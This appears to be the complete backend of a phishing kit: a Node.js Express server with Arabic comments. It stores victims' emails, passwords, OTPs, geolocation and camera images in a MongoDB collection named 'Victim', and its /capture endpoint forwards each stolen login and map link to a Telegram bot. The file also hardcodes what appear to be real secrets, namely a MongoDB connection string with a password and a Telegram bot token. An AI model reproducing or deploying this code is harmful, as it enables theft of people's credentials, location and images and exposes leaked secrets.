const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express(); // يجب تعريف app قبل استخدامه

// إعدادات الربط بناءً على صورك
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to MongoDB Cluster0"))
    .catch(err => console.error("❌ MongoDB Error:", err));

// تعريف الجدول
const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, password: String, otp: String, location: Object, image: String, device: String, date: { type: Date, default: Date.now }
}));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/capture', async (req, res) => {
    try {
        const { email, password, location, image, device } = req.body;
        const newVictim = new Victim({ email, password, location, image, device });
        await newVictim.save();

        const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الموقع مرفوض";
        const message = `🔥 صيد جديد!\n📧 إيميل: ${email}\n🔑 باسورد: ${password}\n📍 خريطة: ${mapUrl}\n📱 جهاز: ${device}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { chat_id: CHAT_ID, text: message });

        res.status(200).send("OK");
    } catch (e) { res.status(500).send("Error"); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
